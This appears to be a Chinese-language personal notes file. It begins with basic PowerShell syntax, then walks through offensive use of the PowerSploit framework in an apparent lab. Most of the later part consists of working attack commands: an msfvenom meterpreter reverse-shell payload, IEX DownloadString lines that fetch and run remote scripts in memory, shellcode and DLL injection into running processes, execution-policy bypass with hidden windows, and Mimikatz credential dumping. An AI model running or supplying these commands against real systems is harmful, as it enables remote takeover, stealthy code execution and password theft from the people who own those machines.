# powershell

## 基本语法

```
Get-Help
主题 Windows PowerShell 帮助系统
Get-Alias
获取当前会话中的所有别名
获取别名之后你会发现，有很多和linux相通的命令  cd  ls   tee  .....
关于Cmdlets
powershell里重要的命令集合
以.net形式存在
Get-Command -CommandType cmdlet 命令可以获取其命令集
start-process
start-process  notepad.exe
Get-Process
获取指定的进程
Get-Content
类似cat
Get-Location
类似pwd
Copy-Item
cp
Move-Item
mv
```

## 运算符

```
运算符
· >:将输出保存到指定文件中（用法：Get-Process>output.txt）

· >>:将脚本的输出追加到指定文件中（用法：test.ps1>>output.txt）

· 2>:将错误输出到指定文件中（Get-Porcess none 2>Errors.txt）

· 2>>:将错误追加到指定文件中（Get-Process none 2>> logs-Errors.txt）

· -eq:等于运算符（用法：$var1 –eq $var2，返回真或假）

· -gt:大于运算符（用法：$var1 –gt $var2，返回真或假）

· -match:匹配运算符，搜索字符串是否在文中出现（用法：$Text –match $string返回真或假）

· -replace:替换字符串（用法：$Text –replace 被替换的字符,替换的字符，返回真或假）

· -in：测试一个字符或数字是否出现在文本中或列表中，声明列表直接使用（）
数组
$Array = value1, value2, value3
语句
条件语句
If($var {comparison_statement} $var2) { What_To_Do)}
Else {what_to_do_if_not}
循环语句
· While () {}

· Do {} While()

· For(;;;) {}
```

## 模块分析

#### Powersploit的使用

**下载路径**

```
https://github.com/PowerShellMafia/PowerSploit
```



```
CodeExecution 在目标主机执行代码
ScriptModification 在目标主机上创建或修改脚本
Persistence 后门脚本(持久性控制)
AntivirusBypass 发现杀软查杀特征
Exfiltration 目标主机上的信息搜集工具
Mayhem 蓝屏等破坏性脚本
Recon 以目标主机为跳板进行内网信息侦查
Privesc 跟权限提升有关的脚本
```

#### 一、AntivirusBypass(绕过杀毒)

```
Find-AVSignature   发现杀软的签名
```

#### 二、CodeExecution(代码执行)

```
1.  Invoke-DllInjection.ps1  DLL注入脚本 注意dll架构要与目标进程相符，同时要具备相应的权限
2.  Invoke-ReflectivePEInjection.ps1   反射型注入 将Windows PE文件（DLL / EXE）反射加载到powershell进程中，或反射地将DLL注入远程进程
3.  Invoke-Shellcode.ps1   将shellcode插入您选择的进程ID或本地PowerShell中
4.  Invoke-WmiCommand.ps1  在目标主机使用wmi执行命令
```

#### 三、Exfiltration(信息收集)    #这个文件夹主要是收集目标主机上的信息

```
1.  Out-Minidump.ps1              生成一个进程的全内存小数据库
2.  Get-VaultCredential.ps1 显示Windows徽标凭据对象，包括明文Web凭据
3.  Get-Keystrokes.ps1       记录按键，时间和活动窗口
4.  Get-GPPPassword.ps1          检索通过组策略首选项推送的帐户的明文密码和其他信息
5.  Get-GPPAutologon.ps1        如果通过组策略首选项推送，则从registry.xml检索自动登录用户名和密码
6.  Get-TimedScreenshot.ps1    这是一个以定期间隔拍摄屏幕并将其保存到文件夹的功能
7.  Invoke-Mimikatz.ps1            查看主机密码
8.  Invoke-NinjaCopy.ps1          通过读取原始卷并解析NTFS结构，从NTFS分区卷复制文件
9.  Invoke-CredentialInjection.ps1    使用明文凭据创建登录，而不会触发可疑事件ID 4648（显式凭证登录）
10.  Invoke-TokenManipulation.ps1         列出可用的登录令牌。与其他用户创建进程登录令牌，并模仿当前线程中的登录令牌
11.  Get-MicrophoneAudio.ps1        通过麦克风记录声音

12. VolumeShadowCopyTools.ps1      
```

#### 四、Recon(信息侦察)   #这个文件夹主要是以目标主机为跳板进行内网主机侦察

```
1. Invoke-Portscan.ps1   端口扫描
2. Get-HttpStatus.ps1      返回指定路径的HTTP状态代码和完整URL，并附带字典文件
3. Invoke-ReverseDnsLookup.ps1  扫描DNS PTR记录的IP地址范围
4. PowerView.ps1       PowerView是一系列执行网络和Windows域枚举和利用的功能
5.Get-ComputerDetails   获得登录信息
```



#### 五、ScriptModification(脚本修改)

```
1. Out-EncodedCommand.ps1    将脚本或代码块编码，并为PowerShell有效载荷脚本生成命令行输出
2. Out-EncryptedScript.ps1   加密文本文件/脚本
3. Out-CompressedDll.ps1   压缩，Base-64编码，并输出生成的代码，以将受管理的DLL加载到内存中
4. Remove-Comments.ps1       从脚本中删除注释和多余的空白
```



#### 六、Persistence(权限维持)

```
1. New-UserPersistenceOption  为添加持久性函数配置用户级持久性选项。
2. New-ElevatedPersistenceOption   为添加持久性函数配置提升的持久性选项。
3. Add-Persistence    向脚本添加持久性功能
4. Install-SSP        安装安全支持提供程序（ssp）dll
5. Get-SecurityPackages
```

#### 七、Privesc(提权)

```
PowerUP: 共同特权升级检查的信息交换所，以及一些武器化载体
Get-System
```

#### 八、Mayhem

```
Set-MasterBootRecord   选择的消息覆写主引导记录
Set-CriticalProcess  退出powershell时使系统蓝屏
```



### PowerSploit使用

上传powersploit到服务器



生成powershell脚本

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.169 LPORT=10875 -f powershell -o shell.txt
```

![](./powershell_image/1.png)

使用kali搭建http服务器，这里默认生成就在桌面

```
python -m SimpleHTTPServer port 9000 有问题
python3 -m http.server 9090 python3 (在哪儿启动，哪儿就是web服务器的根目录)
```

![](./powershell_image/2.png)

![](./powershell_image/3.png)

目标服务器导入命令执行模块(CodeExecution)

如果设置了不允许默认导入(Set-ExecutionPolicy restricted) 有执行策略限制

![](./powershell_image/4.png)

修改执行策略  Set-ExecutionPolicy unrestricted)

导入命令执行模块
```
set-ExecutionPolicy unrestricted
Import-Module C:\install\rolan\tools\powershell\PowerSploit-master\CodeExecution\Invoke-Shellcode.ps1
```
![](./powershell_image/image-20201207124559650.png)

下载远程服务器powershell脚本

```
IEX功能类似与php中的eval，执行表达式的意思
这里是kali
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.169:9090/shell.txt') 
```



![](./powershell_image/image-20201207124820984.png)

kali开启监听

![](./powershell_image/image-20201207125335182.png)

查看进程编号

tasklist

![](./powershell_image/image-20201207125434266.png)

执行

```
Invoke-Shellcode -Shellcode @($buf) -ProcessId 1076(要注入进程的id)
```



如果注入失败可以更换别的进程号

![](./powershell_image/7.png)

成功反弹会话
![](./powershell_image/p.png)

### 绕过限制策略导入ps模块并执行

##### 用IEX远程下载PS1脚本绕过权限执行

文件不落地，直接将远程服务器的ps脚本导入到目标服务器的内存中

```
类似于:远程文件包含
iex(New-Object Net.WebClient).DownloadString("http://192.168.1.40:9090/PowerSploit-master/CodeExecution/Invoke-DllInjection.ps1")

iex(New-Object Net.WebClient).DownloadString("http://192.168.1.40:9090/Invoke-DllInjection.ps1")


msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.1690 lport=1180  -f dll -o /root/桌面/3.dll

Invoke-DllInjection -ProcessID 1056 -Dll http://192.168.1.40:9090/1.dll
Invoke-DllInjection -ProcessID 1056 -Dll 1.dll
```

##### 本地隐藏绕过权限执行脚本

```
PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden NoLogo -NonInteractive -NoProfile File xx.ps1
```

##### 绕过本地权限执行

上传xx.ps1至目标服务器，在CMD环境下，在目标服务器本地执行该脚本，如下所示。

```
PowerShell.exe -ExecutionPolicy Bypass -File xx.ps1
```

如何在cmd绕过策略限制

```
PowerShell.exe -ExecutionPolicy Bypass -File hello.ps1

PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo-NonInteractive -NoProfile -File xxx.ps1

执行完之后隐藏
PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Nonl IEX (New-Object Net.WebClient).DownloadString("hello.ps1");[Parameters]


```





使用powershell的Mimikatz模块导出密码

```
Import-Module C:\install\rolan\tools\powershell\PowerSploit-master\Exfiltration\Invoke-Mimikatz.ps1
Invoke-Mimikatz –DumpCreds
```

![](./powershell_image/image-20201207155722560.png)

